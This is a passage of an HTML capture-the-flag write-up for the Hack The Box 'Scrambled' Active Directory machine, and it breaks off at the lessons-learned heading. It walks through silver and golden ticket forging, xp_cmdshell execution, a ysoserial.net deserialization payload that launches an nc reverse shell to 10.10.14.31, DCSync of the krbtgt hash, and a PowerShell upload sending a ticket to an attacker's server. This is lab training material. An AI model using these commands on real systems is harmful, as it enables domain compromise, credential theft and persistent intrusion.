+<h3 id="creating-the-silver-ticket-with-impacket-ticketer">Creating the silver ticket with <code>impacket-ticketer</code>:</h3>
+<ul>
+<li>As we have all the necessary parts, domain <code>SID</code>, password &amp; <code>NTLM</code> hash we should be able to craft a <code>kerberos</code> silver ticket.</li>
+<li><strong>I use</strong> <code>impacket-ticketer</code> <strong>to make the silver ticket</strong>:
+<ul>
+<li><code>impacket-ticketer -nthash $hash -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain $domain -dc-ip dc1.$domain -spn MSSQLSvc/dc1.scrm.local:1433 administrator</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-113003_.png">
+</figure>
+</li>
+<li>As you can see there are some errors, however it still creates the <code>administrator.ccache</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="using-the-silver-ticket-to-access-the-sql-instance">Using the silver ticket to access the <code>SQL</code> instance:</h3>
+<ul>
+<li>
+<p><strong>I load the ticket into the</strong> <code>KRB5CCNAME</code> <strong>variable</strong></p>
+<ul>
+<li><code>export KRB5CCNAME=./administrator.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-113229_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I check the ticket is loaded with</strong> <code>klist</code>:</p>
+<ul>
+<li><code>klist</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-113345_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I access the host using</strong> <code>impacket-mssqlclient</code>:</p>
+<ul>
+<li><code>impacket-mssqlclient dc1.$domain -k</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-113539_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-foothold">3. Foothold:</h2>
+<h3 id="activating-xp-cmdshell-on-the-host-to-enumerate-the-underlying-host-system">Activating <code>xp_cmdshell</code> on the host to enumerate the underlying host system:</h3>
+<ul>
+<li>
+<p><strong>As soon as I connect I see if I can activate</strong> <code>xp_cmdshell</code>:</p>
+<ul>
+<li><code>enable_xp_cmdshell</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-114646_.png">
+</figure>
+</li>
+<li>It works which means we now have remote code execution on the host itself.</li>
+</ul>
+</li>
+<li>
+<p><strong>I check my privs</strong>:</p>
+<ul>
+<li><code>xp_cmdshell whoami /priv</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-114835_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I enumerate the host &amp; the website directory</strong>:</p>
+<ul>
+<li>I try and read the logs and history files but do not have the correct perms:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-115438_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I also check the users home folders but I can only access my own and there is nothng of note</strong>:</p>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-10-07-115516_.png">
+</figure>
+
+</li>
+<li>
+<p><strong>I try and enumerate the shares but I don&rsquo;t have access there either</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-115347_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="getting-a-reverse-shell-as-sqlsvc">Getting a reverse shell as <code>sqlsvc</code>:</h3>
+<ul>
+<li><strong>As we have remote code execution we can trigger a reverse shell on the host</strong>:
+<ul>
+<li>I create a revere shell with <a href="https://revshells.com">https://revshells.com</a></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><strong>I start my listener</strong>:</p>
+<ul>
+<li><code>nc -nvlp 443</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I use</strong> <code>xp_cmdshell</code> <strong>to execute my shell</strong>:</p>
+<ul>
+<li><code>xp_cmdshell powershell -e &lt;base64EncodedString&gt;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-181152_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Shell Caught</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-181349_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Enumeration dead-end</strong>:</p>
+<ul>
+<li>I do some further enumeration however it is a dead-end…as far as I can see.</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-the-database-and-finding-creds-for-miscsvc">Enumerating the Database &amp; Finding Creds for <code>MiscSvc</code>:</h3>
+<ul>
+<li>
+<p>As was mentioned in the PDF we read earlier, the previous attackers were able to compromise the domain after gaining access to the HR database.</p>
+</li>
+<li>
+<p><strong>I enumerate the databases</strong>:</p>
+<ul>
+<li><code>enum db</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-130950_.png">
+</figure>
+</li>
+<li>We can see the HR db is listed.</li>
+</ul>
+</li>
+<li>
+<p><strong>I select the database</strong>:</p>
+<ul>
+<li><code>use ScrambleHR</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I list it&rsquo;s tables &amp; find an interesting table called</strong>: <code>UserImport</code>:</p>
+<ul>
+<li><code>select * from ScrambleHR.INFORMATION_SCHEMA.TABLES</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-131223_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I list the contents of it to find the</strong> <code>LdapPwd</code> <strong>of the</strong> <code>MiscSvc</code> <strong>account</strong>:</p>
+<ul>
+<li><code>select * from UserImport</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-131638_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I list the contents of the other shares but they are empty</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-131922_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-lateral-movement">4. Lateral Movement:</h2>
+<h3 id="getting-a-shell-as-miscsvc">Getting a shell as <code>MiscSvc</code>:</h3>
+<p>As I have credentials it dawned on me I can most likely invoke a <code>ps-session</code> using the creds of <code>MiscSvc</code> once I have an established session…..right?</p>
+<h4 id="and-here-s-what-didnt-work">And here&rsquo;s what didnt&rsquo; work:</h4>
+<ul>
+<li>
+<p><strong>I re-connect my reverse shell like I did with the</strong> <code>sqlsvc</code> <strong>account using</strong> <code>xp_cmdshell</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-070236_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try and invoke a</strong> <code>ps-session</code> * but it does not work*:</p>
+<ul>
+<li><code>enter-pssession -computername localhost -Credential miscsvc@scrm.local</code></li>
+<li><code>enter-pssession -computername dc1.scrm.local  -Credential miscsvc@scrm.local</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-070408_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Let&rsquo;s try</strong> <code>runas</code>:</p>
+<ul>
+<li><code>runas /user:miscsvc &quot;powershell&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-071257_.png">
+</figure>
+</li>
+<li>It looks like it will work as it prompts for the password but then doesn&rsquo;t let me enter it.</li>
+</ul>
+</li>
+<li>
+<p><strong>Lets try</strong> <code>PWSH</code> <strong>(Powershell for linux)</strong>:</p>
+<ul>
+<li><code>enter-pssession -computername dc1.scrm.local  -Credential miscsvc@scrm.local</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-071440_.png">
+</figure>
+</li>
+<li>Again it doesn&rsquo;t work but tells us this is due to <code>wsman</code> not being installed, so let&rsquo;s install it.</li>
+</ul>
+</li>
+<li>
+<p><strong>Installing</strong> <code>PSWSMan</code> <strong>&amp;</strong> <code>WSMan</code>:</p>
+<ul>
+<li>
+<p>After trying various different spellings etc I did some googling:</p>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-10-08-072148_.png">
+</figure>
+
+<ol>
+<li>Install-Module -Name PSWSMan</li>
+<li>Install-WSMan</li>
+<li>Exit</li>
+</ol>
+</li>
+<li>
+<p><strong>Still no dice it will fail consistently</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-073446_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="here-is-what-did-work-good-ol-and-x2026-dot-secure-and-x2026-dot-invoke">Here is what did work Good Ol&rsquo; ….Secure….Invoke:</h4>
+<ul>
+<li><strong>We can pass a secure string &amp; then invoke a command as the user</strong> <code>miscsvc</code> <strong>using the credentialed</strong>:
+<ul>
+<li>From the <code>nc</code> reverse shell we established as <code>sqlsvc</code> we can run the following commands.</li>
+<li><code>$SecPassword = ConvertTo-SecureString '&lt;Pass&gt;' -AsPlainText -Force</code></li>
+<li><code>$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)</code></li>
+<li><code>Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { &lt;CommmandToRun&gt; }</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-073730_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="getting-our-reverse-shell-as-miscsvc">Getting our reverse shell as <code>MiscSvc</code>:</h4>
+<ul>
+<li>
+<p><strong>I generate another reverse shell from</strong> <a href="https://revshells.com">https://revshells.com</a>:</p>
+</li>
+<li>
+<p><strong>Start another listener</strong>:</p>
+<ul>
+<li><code>nc -nlvp 9999</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Paste in my command</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-143924_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Shell Caught</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-143957_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Other than the flag there is not much on here….</strong></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-152159_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="here-s-a-breakdown-of-why-this-works-code-explanation">Here&rsquo;s a breakdown of why this works Code Explanation:</h5>
+<ol>
+<li>
+<p><strong>Convert password to a secure string</strong>:</p>
+<ul>
+<li><code>$SecPassword = ConvertTo-SecureString '&lt;Password&gt;' -AsPlainText -Force</code>
+<ul>
+<li><code>ConvertTo-SecureString</code>: Converts a plain text string <code>'&lt;Password&gt;'</code>) into a secure string.</li>
+<li><code>-AsPlainText</code>: This flag tells PowerShell that the input is plain text (non-secure).</li>
+<li><code>-Force</code>: Suppresses warnings/errors and forces the command to accept plain text input.</li>
+<li><strong>Result</strong>: The password is stored as an encrypted <code>SecureString</code> in the <code>$SecPassword</code> variable.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Create a credential object</strong>:</p>
+<ul>
+<li><code>$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)</code>
+<ul>
+<li><code>New-Object System.Management.Automation.PSCredential</code>: This creates a new credential object, combining a username and the secure password.</li>
+<li><code>'scrm.local\MiscSvc'</code>: The username is <code>'scrm.local\MiscSvc'</code>.</li>
+<li><code>$SecPassword</code>: The password (in secure string format) is passed to the credential object.</li>
+<li><strong>Result</strong>: The <code>$Cred</code> object contains the username and encrypted password.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Invoke-Command to execute a script block on a target machine</strong>:</p>
+<ul>
+<li><code>Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }</code>
+<ul>
+<li><code>Invoke-Command</code>: Executes the specified script block <code>{ whoami }</code> on a remote computer.</li>
+<li><code>-Computer 127.0.0.1</code>: Target machine is <code>127.0.0.1</code> (the local machine).
+<ul>
+<li>As we want to authorize with creds we have for the local machine.</li>
+</ul>
+</li>
+<li><code>-Credential $Cred</code>: Specifies the credentials to use (`$Cred`, the object created above).</li>
+<li><code>-ScriptBlock { whoami }</code>: The script block to be executed on the target machine.
+<ul>
+<li>+Note+: Any command can be placed here, like our reverse shell</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>Summary</strong>:
+<ul>
+<li>Converts a plain text password to a secure string.</li>
+<li>Creates a credential object.</li>
+<li>Executes a command on the local machine using the specified credentials.</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-smb-shares-as-miscsvc">Enumerating SMB shares as <code>miscsvc</code></h3>
+<ul>
+<li>
+<p><strong>I connect to the SMB shares as miscsvc using the</strong> <code>impacket-smbclient</code></p>
+<ul>
+<li><code>impacket-smbclient $domain/$user:$pass@dc1.$domain -k</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I have access to the</strong> <code>IT</code> <strong>share</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-134629_.png">
+</figure>
+</li>
+<li>We access 3 folder:
+<ul>
+<li>Apps</li>
+<li>Logs</li>
+<li>Reports</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I check the Apps folder &amp; find a copy of their sales application</strong> <code>ScrambleClient.exe</code> <strong>&amp;</strong> <code>.dll</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-154709_.png">
+</figure>
+</li>
+<li>I download both:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-154729_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I check the other folders but they are empty.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>I quickly check if we have acess to any other shares</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-134814_.png">
+</figure>
+</li>
+<li>So far we don&rsquo;t.</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-the-scrambledclient-dot-exe">Using the <code>ScrambledClient.exe</code>:</h3>
+<ul>
+<li>
+<p><strong>I transfer the</strong> <code>ScrambledClient.exe</code> <strong>to my Windows VM &amp; connect to the HTB VPN</strong>:</p>
+</li>
+<li>
+<p><strong>I edit my</strong> <code>hosts</code> <strong>file to have the same entries as my linux host</strong>:</p>
+<ul>
+<li><code>.\notepad.exe C:\Windows\System32\drivers\etc\hosts</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I enable debugging like it said on the intranet page &amp; try and connect</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-173238_.png">
+</figure>
+</li>
+<li>I try both this user and <code>sqlsvc</code> but neither work.</li>
+</ul>
+</li>
+<li>
+<p><strong>Discovering the credential format the program expects by reading the log file</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-172839_.png">
+</figure>
+</li>
+<li>This is interesting as we now know the format that the program expects credentials in.
+<ul>
+<li><code>LOGON;&lt;username&gt;|&lt;password&gt;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try all known usernames and passwords I have but no hits</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-182343_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-a-login-bypass-by-examining-the-scramblelib-dot-dll-in-dnspy">Finding a login bypass by Examining the <code>ScrambleLib.dll</code> in <code>DNSpy</code>:</h3>
+<p><code>DLL</code>&rsquo;s can hold a lot of valuable information so they are worth examining with tools like <a href="https://github.com/dnSpy/dnSpy?tab=readme-ov-file">DNSpy</a>:</p>
+<ul>
+<li>
+<p><strong>I open up DNSpy in my Windows VM</strong>:</p>
+<ul>
+<li>If don&rsquo;t have it already you can easily download it here:
+<ul>
+<li><a href="https://github.com/dnSpy/dnSpy/releases">https://github.com/dnSpy/dnSpy/releases</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I open up the</strong> <code>DLL</code> <strong>and find an authentication bypass</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-160939_.png">
+</figure>
+</li>
+<li>As you can see below the code says:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20if%20%28string.Compare%28Username,%20%22scrmdev%22,%20true%29%20==%200%29%0a%09%09%20%20%20%20%20%20%20%20%20%7b%0a%09%09%09%20%20%20%20%20%20%20%20%20%20%20%20%20Log.Write%28%22Developer%20logon%20bypass%20used%22%29;%0a%09%09%09%20%20%20%20%20%20%20%20%20%20%20%20%20result%20=%20true;%0a%09%09%20%20%20%20%20%20%20%20%20%7d%0a%09%09%20%20%20%20%20%20%20%20%20else">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (string.<span style="color:#a6e22e">Compare</span>(Username, <span style="color:#e6db74">&#34;scrmdev&#34;</span>, true) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>		         {
+</span></span><span style="display:flex;"><span>			             Log.<span style="color:#a6e22e">Write</span>(<span style="color:#e6db74">&#34;Developer logon bypass used&#34;</span>);
+</span></span><span style="display:flex;"><span>			             result <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>		         }
+</span></span><span style="display:flex;"><span>		         <span style="color:#66d9ef">else</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>this basically says if we enter <code>scrmdev</code> as the user we will be logged in without having to enter a password</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-dot-privilege-escalation">5. Privilege Escalation:</h2>
+<h3 id="logging-into-scrambledclient-dot-exe-using-scrmdev-creds">Logging into <code>ScrambledClient.exe</code> using <code>scrmdev</code> creds:</h3>
+<ul>
+<li>
+<p>I connect with the creds:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-163610_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I&rsquo;m in.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-163844_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Test order:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-164725_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-10-08-164803_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="examining-how-serialized-data-is-sent-via-scrambledclient-dot-exe">Examining how serialized data is sent via <code>ScrambledClient.exe</code>:</h3>
+<ul>
+<li><strong>Checking Debug Log</strong>:
+<ul>
+<li>We can see the data is being serialized (converted) to base64</li>
+<li><figure><img src="/ox-hugo/2024-10-08-164822_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>I decode the</strong> <code>Base64</code> <strong>data in kali to see if there is anything valuable being sent</strong>
+<ul>
+<li><code>echo &quot;&lt;base64string&gt;&quot; | base64 -d</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-165210_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><strong>I try SQL injection incase there is a way to leak information from the underlying database, however it doesn&rsquo;t work</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-195929_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Before each upload the string</strong> <code>Binary formatter init successful</code> <strong>is listed</strong>:</p>
+<ul>
+<li>Looking online I find this <a href="https://learn.microsoft.com/en-us/dotnet/core/compatibility/serialization/5.0/binaryformatter-serialization-obsolete">article</a> from microsoft regarding how <code>BinaryFormatter</code> is now obsolete due to security vulnerabilites:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-200206_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="6-dot-ownership">6. Ownership:</h2>
+<h3 id="crafting-a-payload-with-yoserial-dot-net-and-catching-a-system-shell">Crafting a Payload with <code>yoserial.net</code> &amp; catching a system shell:</h3>
+<ul>
+<li>
+<p><strong>I do some quick searching and find</strong> <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-200320_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Initially I try and use a simple base64 encoded powershell reverse shell but it spits out a bunch of errors</strong>:</p>
+<ul>
+<li><code>.\yoserial.exe -f BinaryFormatter -q WindowsPrincipal -o base64 -c &quot;&lt;CommandToRun&gt;&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-201738_.png">
+</figure>
+</li>
+<li>I figure it could be a length exception so I transfer <code>nc.exe</code> to the C:\Temp folder for ease.</li>
+</ul>
+</li>
+<li>
+<p><strong>Well that doesn&rsquo;t work either, so suppose we need to troubleshoot and fix this</strong>:</p>
+<ul>
+<li><code>.\yoserial.exe -f BinaryFormatter -q WindowsPrincipal -o base64 -c &quot;&lt;CommandToRun&gt;&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-202001_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>After some digging I found that</strong> <code>1.35</code> <strong>works fine where as</strong> <code>1.36</code> <strong>has other deps</strong>:</p>
+<ul>
+<li><del>Important Note</del>: Use Release <code>1.35</code> <del>not</del> <code>1.36</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I generate my payload using</strong> <code>yoserial.net v1.35</code>:</p>
+<ul>
+<li><code>ysoserial-1.35\Release&gt; .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c &quot;C:\Temp\nc.exe 10.10.14.31 443 -e cmd&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-202629_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Use the same syntax the program uses to upload it</strong>:</p>
+<ul>
+<li><code>UPLOAD_ORDER;&lt;base64string&gt;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-205350_.png">
+</figure>
+</li>
+<li>We can see it errors out, but that&rsquo;s fine.</li>
+</ul>
+</li>
+<li>
+<p><strong>Catch my system shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-202708_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Get root flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-202751_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="7-dot-persistence">7. Persistence:</h2>
+<h3 id="creating-a-golden-ticket-with-mimikatz">Creating A Golden Ticket with <code>mimikatz</code>:</h3>
+<ul>
+<li>
+<p><strong>I upload mimikatz via my python webserver</strong>:</p>
+</li>
+<li>
+<p><strong>I perform a dcsync attack and dump the</strong> <code>krbtgt</code> <strong>hash</strong>:</p>
+<ul>
+<li><code>lsadump::dcsync /user:krbtgt /domain:scrm.local</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-203752_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>I forge a golden ticket using the</strong> <code>Domain-SID</code> <strong>&amp;</strong> <code>krbtgt</code> <strong>hash</strong>:
+<ul>
+<li><code>kerberos::golden /domain:scrm.local /user:Administrator /sid:S-1-5-21-2743207045-1827831105-2542523200 /rc4:&lt;HASH&gt;</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-203858_.png">
+</figure>
+</li>
+<li>The ticket is is present:</li>
+<li><figure><img src="/ox-hugo/2024-10-08-203935_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="transferring-the-golden-ticket-using-my-custom-python-webserver">Transferring the Golden Ticket Using my custom python webserver:</h3>
+<ol>
+<li>
+<p><strong>Start my custom python webserver</strong>:</p>
+<ul>
+<li>I have this handy python webserver that is useful when exfiling data.
+<ul>
+<li>Save as <code>pythonServer.py</code></li>
+<li>Rung <code>python3 pythonServer.py</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> SimpleHTTPRequestHandler, HTTPServer
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SimpleHTTPUploadHandler</span>(SimpleHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_POST</span>(self):
+</span></span><span style="display:flex;"><span>         length <span style="color:#f92672">=</span> int(self<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Content-Length&#39;</span>])
+</span></span><span style="display:flex;"><span>         field_data <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>rfile<span style="color:#f92672">.</span>read(length)
+</span></span><span style="display:flex;"><span>         <span style="color:#75715e">#If you prefer change the file to be whatever you want</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;uploaded_file&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>             f<span style="color:#f92672">.</span>write(field_data)
+</span></span><span style="display:flex;"><span>         self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>         self<span style="color:#f92672">.</span>end_headers()
+</span></span><span style="display:flex;"><span>         self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;File uploaded successfully&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># You can set the port to be 443 etc so it looks more legitimate.</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(server_class<span style="color:#f92672">=</span>HTTPServer, handler_class<span style="color:#f92672">=</span>SimpleHTTPUploadHandler, port<span style="color:#f92672">=</span><span style="color:#ae81ff">9000</span>):
+</span></span><span style="display:flex;"><span>     server_address <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;&#39;</span>, port)
+</span></span><span style="display:flex;"><span>     httpd <span style="color:#f92672">=</span> server_class(server_address, handler_class)
+</span></span><span style="display:flex;"><span>     print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Starting httpd server on port </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>     httpd<span style="color:#f92672">.</span>serve_forever()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>     run()</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+<li><del>NOTE</del>: Will output file as <code>uploaded_file</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Send the ticket from victim using</strong> <code>powershell</code>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> filePath = <span style="color:#e6db74">&#34;C:\Temp\ticket.kirbi&#34;</span>; $url = <span style="color:#e6db74">&#34;http://10.10.14.31:9000&#34;</span>; $fileBytes = [<span style="color:#66d9ef">System.IO.File</span>]::ReadAllBytes($filePath); $webClient = New-Object System.Net.WebClient; $webClient.UploadData($url, $fileBytes)</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-204509_.png">
+</figure>
+</li>
+<li><strong>Ticket received on our attack host</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-204431_.png">
+</figure>
+</li>
+<li>+Note+: The file will be called <code>uploaded_file</code> you will have to change it back to <code>&lt;file&gt;.kirbi</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Convert with</strong> <code>impacket-ticketconverter</code>:</p>
+<ul>
+<li><code>impacket-ticketConverter ticket.kirbi admin.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-204926_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Import into session my current session</strong>:</p>
+<ul>
+<li><code>export KRB5CCNAME=./admin.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-205009_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Check ticket is loaded into memory</strong>:</p>
+<ul>
+<li><code>klist</code></li>
+<li><figure><img src="/ox-hugo/2024-10-08-205033_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Fire up</strong> <code>impacket-psexec</code> <strong>and connect</strong>:</p>
+<ul>
+<li>We have persistence.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-08-205150_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
